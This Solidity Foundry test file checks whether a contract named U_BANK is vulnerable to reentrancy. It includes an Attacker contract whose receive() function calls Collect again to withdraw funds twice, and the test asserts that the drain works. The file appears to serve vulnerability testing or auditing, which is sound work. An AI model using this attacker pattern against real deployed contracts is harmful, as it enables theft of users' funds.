
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {U_BANK,Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new U_BANK(address(_logContract));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 2 ether);
        vm.assume(attackVal <= type(uint128).max);
        vm.assume(attackVal * 2 <= type(uint128).max);

        uint256 depositAmount = attackVal * 2;
        
        vm.deal(address(_contractUnderTest), depositAmount);
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);

        _attacker.setupAttack{value: depositAmount}(attackVal, block.timestamp + 100);
        
        vm.warp(block.timestamp + 101);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    U_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public attackAmount;
    
    constructor(address victimAddress) {
        victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val, uint256 unlockTime) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Put{value: msg.value}(unlockTime);
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        
        victim.Collect(val);
        
        uint256 finalVictimBalance = address(victim).balance;
        if (finalVictimBalance <= initialVictimBalance - (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }

    fallback() external payable {}
}
